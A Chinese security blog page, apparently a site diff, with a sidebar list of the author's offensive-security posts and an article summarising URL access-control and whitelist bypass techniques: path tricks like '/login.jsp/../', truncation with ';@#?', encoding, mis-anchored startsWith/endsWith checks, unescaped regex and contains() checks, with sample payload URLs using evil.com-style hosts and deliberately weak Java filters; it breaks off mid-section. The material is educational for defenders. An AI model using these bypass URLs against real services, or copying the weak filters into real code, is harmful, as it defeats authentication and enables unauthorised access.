+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636568" target="_blank" rel="noopener">(旧博客)基址重定位表</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636900" target="_blank" rel="noopener">(旧博客)从可执行文件中删除.reloc节区</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80656921" target="_blank" rel="noopener">(旧博客)UPack的PE文件头分析与OEP查找</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80670045" target="_blank" rel="noopener">(旧博客)内嵌补丁练习</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80684358" target="_blank" rel="noopener">(旧博客)Windows消息钩取</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80777748" target="_blank" rel="noopener">(旧博客)DLL注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80780830" target="_blank" rel="noopener">(旧博客)DLL卸载</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80789234" target="_blank" rel="noopener">(旧博客)通过修改PE加载DLL</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82947635" target="_blank" rel="noopener">(旧博客)代码注入（线程注入）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82954890" target="_blank" rel="noopener">(旧博客)使用汇编语言编写注入代码</a></li>
+</ul>
+</li>
+<li>Fuzzing<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80950537" target="_blank" rel="noopener">(旧博客)Windows缓冲区溢出之SLMail</a></li>
+</ul>
+</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681200" target="_blank" rel="noopener">(旧博客)被动信息收集之DNS信息收集</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681596" target="_blank" rel="noopener">(旧博客)被动信息收集之RECON-NG</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63682444" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63684778" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/64906997" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/66473045" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301318" target="_blank" rel="noopener">(旧博客)渗透测试之漏洞扫描阶段</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57405291" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统下隐藏痕迹的小技巧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57403811" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统中的一些信息收集方法</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76598873" target="_blank" rel="noopener">(旧博客)使用Kali无线渗透获取宿舍WiFi密码（WPA）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62239673" target="_blank" rel="noopener">(旧博客)关于Kali的两个Webshell（Webacoo和Weevely）的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62064984" target="_blank" rel="noopener">(旧博客)关于Kali获取HTTP账号密码的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62045632" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP欺骗的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61926977" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP攻击的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61920179" target="_blank" rel="noopener">(旧博客)在Kali中安装IBus的拼音输入法</a></li>
+<li></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60881390" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（一）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62427016" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（二）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/77103290" target="_blank" rel="noopener">(旧博客)Metasploit的Docker安装及其Eternal Blue（永恒之蓝）渗透实现</a></li>
+</ul>
+</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78333085" target="_blank" rel="noopener">(旧博客)Wireshark进阶之网络问题案例分析</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61651960" target="_blank" rel="noopener">(旧博客)关于nmap所有的参数</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60332892" target="_blank" rel="noopener">(旧博客)关于Xsser的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60151041" target="_blank" rel="noopener">(旧博客)关于skipfish的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58677137" target="_blank" rel="noopener">(旧博客)关于Vega的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58188331" target="_blank" rel="noopener">(旧博客)关于SQLMAP所有参数的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57418307" target="_blank" rel="noopener">(旧博客)关于NETCAT的学习笔记</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716967" target="_blank" rel="noopener">(旧博客)Windows系统安全小结</a></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><a href="/2020/03/28/Linux安全笔记/">Linux安全笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78169962" target="_blank" rel="noopener">(旧博客)Linux查找命令小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72614754" target="_blank" rel="noopener">(旧博客)关于iptables防火墙的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63680773" target="_blank" rel="noopener">(旧博客)关于Linux日志的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78837765" target="_blank" rel="noopener">(旧博客)Ubuntu搭建MongoDB集群</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><strong>云</strong><ul>
+<li>云安全</li>
+<li>Docker<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76696436" target="_blank" rel="noopener">(旧博客)Docker基本命令以及Ubuntu16.04更换源</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76713869" target="_blank" rel="noopener">(旧博客)使用Docker搭建基于MySQL、Apache和PHP的DVWA服务器</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		URL Bypass总结
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x01-利用Spring-MVC框架特性绕过访问控制（suffix-pattern）"><a href="#0x01-利用Spring-MVC框架特性绕过访问控制（suffix-pattern）" class="headerlink" title="0x01 利用Spring MVC框架特性绕过访问控制（suffix-pattern）"></a>0x01 利用Spring MVC框架特性绕过访问控制（suffix-pattern）</h2><p>在Spring MVC框架中，如果使用<code>@RequestMapping</code>注解来匹配URL，当启用后缀匹配模式（suffix-pattern为true）时，URL加任意后缀都能访问到对应的接口。</p>
+<p>例如，构造形如<code>/abc/def.xx</code>的URL，也能够正确匹配到<code>@RequestMapping</code>中定义的方法（<code>/abc/def</code>）。因此可以利用这个特性绕过某些访问控制。</p>
+<h2 id="0x02-利用非标准化绕过（-）"><a href="#0x02-利用非标准化绕过（-）" class="headerlink" title="0x02 利用非标准化绕过（.\/）"></a>0x02 利用非标准化绕过（.\/）</h2><p>假设原始访问URL为<code>http://www.mi1k7ea.com/urltest/index.jsp</code>，则如下URL也能成功解析得到一样的结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.mi1k7ea.com/login/../urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com/./urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com///urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com\urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com\\\urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com/\./urltest/index.jsp</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p><strong>Demo</strong></p>
+<p>这里直接修改<a href="https://xz.aliyun.com/t/7544#toc-11" target="_blank" rel="noopener">《Tomcat URL解析差异性导致的安全问题》</a>中的Demo即可，改的doFilter()的处理逻辑，同时应用了startsWith()和endsWith()来判断鉴权：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">    HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">    String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (url.startsWith(<span class="string">"/login.jsp"</span>) || url.endsWith(<span class="string">"logout.jsp"</span>)) &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>针对startsWith()的认证绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/login.jsp/../urltest/info/secret.jsp</span><br></pre></td></tr></table></figure>
+<p>针对endsWith()的认证绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/urltest/info/secret.jsp;logout.jsp</span><br></pre></td></tr></table></figure>
+<p>此外，<code>//</code>和<code>./</code>也可以绕过一些以特定字符串开头的访问控制，比如代码使用<code>URI.startsWith(&quot;/admin/&quot;)</code>判断以/admin/开头的URI都要进行认证鉴权，那么攻击者构造<code>//admin/</code>、<code>/./admin/</code>、<code>/admin;test/</code>开头的URL都可以绕过访问控制。</p>
+<h2 id="0x03-利用截断绕过（-）"><a href="#0x03-利用截断绕过（-）" class="headerlink" title="0x03 利用截断绕过（;@#?）"></a>0x03 利用截断绕过（;@#?）</h2><p>常用于截断绕过的几个字符：<code>;@#?</code></p>
+<p>假设原始访问URL为<code>http://www.mi1k7ea.com/urltest/index.jsp</code>，绕过技巧如下：</p>
+<table>
+<thead>
+<tr>
+<th>截断符号</th>
+<th>构造的URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>;</td>
+<td><code>http://www.mi1k7ea.com/urltest/index.jsp;logout.jsp</code></td>
+</tr>
+<tr>
+<td>;</td>
+<td><code>http://www.mi1k7ea.com/urltest/;/index.jsp</code></td>
+</tr>
+<tr>
+<td>@</td>
+<td><code>http://www.mi1k7ea.com@www.evil.com/urltest/index.jsp</code></td>
+</tr>
+<tr>
+<td>@</td>
+<td><code>http://@@www.mi1k7ea.com/urltest/index.jsp</code></td>
+</tr>
+<tr>
+<td>#</td>
+<td><code>http://www.evil.com#www.mi1k7ea.com/urltest/index.jsp</code></td>
+</tr>
+<tr>
+<td>?</td>
+<td><code>http://www.evil.com?www.mi1k7ea.com/urltest/index.jsp</code></td>
+</tr>
+<tr>
+<td>\</td>
+<td><code>http://www.mi1k7ea.com.evil.cn\@mi1k7ea.com</code></td>
+</tr>
+</tbody>
+</table>
+<p>注意，两个@在URI中表示无法解析得到Host部分而进入到错误分支。</p>
+<p><strong>Demo——@@</strong></p>
+<p>这里在调用getHost()函数尝试获取@@开头的URI的Host时会解析错误，返回的Host为空，进入错误分支的代码逻辑，如果该分支存在危险操作则会被攻击利用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">"https://@@www.mi1k7ea.com/"</span>;</span><br><span class="line">        URI uri = <span class="keyword">new</span> URI(url);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(uri.getHost()))&#123;</span><br><span class="line">            System.out.println(<span class="string">"Okay"</span>);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                do some dangerous things</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/1.png" alt=""></p>
+<h2 id="0x04-利用编码绕过"><a href="#0x04-利用编码绕过" class="headerlink" title="0x04 利用编码绕过"></a>0x04 利用编码绕过</h2><p>使用部分编码后的URL，如果服务端未经过解码或标准化处理就传入校验器，那么可以绕过ACL。</p>
+<p>假设原始访问URL为<code>http://www.mi1k7ea.com/urltest/index.jsp</code>，绕过技巧如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">编码方式</th>
+<th style="text-align:left">构造的URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">URL</td>
+<td style="text-align:left"><code>http://www.mi1k7ea.com/urltest/%69%6e%64%65%78%2e%6a%73%70</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Base64</td>
+<td style="text-align:left"><code>http://www.mi1k7ea.com/urltest/aW5kZXguanNw</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Unicode</td>
+<td style="text-align:left"><code>http://www.mi1k7ea.com.evil.cn\111.mi1k7ea.com@www.mi1k7ea.com</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Unicode</td>
+<td style="text-align:left"><code>http://evil.cn\u2100B.mi1k7ea.com/</code></td>
+</tr>
+</tbody>
+</table>
+<p>当服务器中的解码器遇到大于ASCII范围的字符时，它将尝试使用Unicode编码进行解码操作，整个解码过程会有错误出现：</p>
+<p><img src="/2020/04/13/URL-Bypass总结/3.png" alt=""></p>
+<p><img src="/2020/04/13/URL-Bypass总结/4.png" alt=""></p>
+<p><strong>Demo——URL编码</strong></p>
+<p>当未对URL进行标准化或解码处理，且程序使用endsWith()、contains()等弱校验时，可以利用URL编码绕过。</p>
+<p>直接修改前面的testFilter：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"><span class="comment">//        String url = Normalizer.normalize(url0,  Normalizer.Form.NFKC);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.endsWith(<span class="string">"/urltest/info/secret.jsp"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里使用URL编码就能成功绕过：</p>
+<p><img src="/2020/04/13/URL-Bypass总结/5.png" alt=""></p>
+<p>绕过原因在于，getRequestURI()和getRequestURL()函数未对输入的URL进行URL解码操作，但程序实际获取到的就是解码后的URL：</p>
+<p><img src="/2020/04/13/URL-Bypass总结/2.png" alt=""></p>
+<h2 id="0x05-白名单配置不当导致绕过（前后未闭合）"><a href="#0x05-白名单配置不当导致绕过（前后未闭合）" class="headerlink" title="0x05 白名单配置不当导致绕过（前后未闭合）"></a>0x05 白名单配置不当导致绕过（前后未闭合）</h2><p>程序使用URL白名单过滤URL，如果URL白名单配置不当，则可被攻击者绕过，比如缺少<code>.</code>、<code>/</code>来闭合域名的前后。</p>
+<ul>
+<li>当使用startsWith()函数校验白名单域名，但缺少<code>/</code>来闭合域名后面时存在绕过风险；</li>
+<li>当使用endsWith()函数校验白名单域名，但缺少<code>.</code>来闭合域名前面时存在绕过风险；</li>
+</ul>
+<p><strong>Demo——startsWith()</strong></p>
+<p>比如白名单域名尾部未使用<code>/</code>来闭合，并且使用startsWith()函数校验白名单域名，则可以使用<code>@</code>拼接恶意URL来绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url_whitelist = <span class="string">"https://www.mi1k7ea.com"</span>;</span><br><span class="line">        String evil_url = <span class="string">"https://www.mi1k7ea.com@www.evil.cn/"</span>;</span><br><span class="line">        <span class="keyword">if</span> (evil_url.startsWith(url_whitelist)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/6.png" alt=""></p>
+<p><strong>Demo——endsWith()</strong></p>
+<p>比如白名单域名头部未使用<code>.</code>来闭合，并且使用endsWith()函数校验白名单域名，则攻击者只需注入如<code>evilmi1k7ea.com</code>的域名即可绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url_whitelist = <span class="string">"mi1k7ea.com"</span>;</span><br><span class="line">        String evil_url = <span class="string">"https://evilmi1k7ea.com"</span>;</span><br><span class="line">        <span class="keyword">if</span> (evil_url.endsWith(url_whitelist)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/7.png" alt=""></p>
+<h2 id="0x06-正则校验绕过"><a href="#0x06-正则校验绕过" class="headerlink" title="0x06 正则校验绕过"></a>0x06 正则校验绕过</h2><p>URL白名单如果使用了正则表达式中的特殊字符<code>$()*+.[?\^{|</code>，且这些字符未做转义处理的话（比如<code>.</code>用<code>\.</code>转义），则可能存在正则被绕过的风险。</p>
+<p><strong>Demo——“.”未转义</strong></p>
+<p>例如，URL白名单中的<code>https://www.mi1k7ea.com</code>中包含<code>.</code>，由于未转义该字符，且该字符在正则表达式中可以代表任意单个字符，因此攻击者可以构造<code>https://wwwxmi1k7ea.com</code>来绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url_whitelist = <span class="string">"https://www.mi1k7ea.com"</span>;</span><br><span class="line">        String evil_url = <span class="string">"https://wwwxmi1k7ea.com"</span>;</span><br><span class="line">        StringBuilder PattStr = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        PattStr.append(<span class="string">"([A-Za-z0-9.-]*\\."</span>).append(url_whitelist).append(<span class="string">"|"</span>).append(url_whitelist);</span><br><span class="line">        PattStr.append(<span class="string">")($|(.*)|\\?.*)"</span>);</span><br><span class="line">        System.out.println(PattStr);</span><br><span class="line">        <span class="keyword">if</span> (Pattern.compile(PattStr.toString()).matcher(evil_url).matches()) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/8.png" alt=""></p>
+<p><strong>Demo——“^”未转义</strong></p>
+<p>例如，使用正则表达式匹配以js的开头的URI就直接放行，此时攻击者可构造<code>/js/../urltest/info/secret.jsp</code>的URL请求实现绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">    HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">    HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">    String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">    if (Pattern.compile(&quot;^/(js)/.*$&quot;).matcher(url).matches()) &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        httpServletResponse.getWriter().write(&quot;No Permission.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/9.png" alt=""></p>
+<h2 id="0x07-域名校验绕过（未校验整个域名，包含模式）"><a href="#0x07-域名校验绕过（未校验整个域名，包含模式）" class="headerlink" title="0x07 域名校验绕过（未校验整个域名，包含模式）"></a>0x07 域名校验绕过（未校验整个域名，包含模式）</h2><p>在进行域名校验时，如果只校验域名的其中一部分，那么可能会导致被绕过的风险。具体的为在业务中使用的是contains()函数进行弱校验。</p>
+<p><strong>Demo</strong></p>
+<p>仅使用contains()弱校验函数进行URL白名单校验导致被绕过，比如攻击者搭建一个域名为<code>www.mi1k7ea.co</code>的网站即可绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI uri = <span class="keyword">new</span> URI(<span class="string">"https://www.mi1k7ea.co/exp"</span>);</span><br><span class="line">        String whitelist = <span class="string">"www.mi1k7ea.com"</span>;</span><br><span class="line">        System.out.println(uri.getHost());</span><br><span class="line">        <span class="keyword">if</span> (whitelist.contains(uri.getHost())) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/10.png" alt=""></p>
+<h2 id="0x08-二义性绕过"><a href="#0x08-二义性绕过" class="headerlink" title="0x08 二义性绕过"></a>0x08 二义性绕过</h2><p>二义性绕过是指浏览器与后端服务器或者前端服务器与后端服务器之间解析URL时存在差异导致的绕过。</p>
+<p><strong>CVE-2017-13274</strong></p>
+<p>该CVE主要是服务端和浏览器侧的认知不一致导致的。</p>
+<p>外部传入URL：</p>
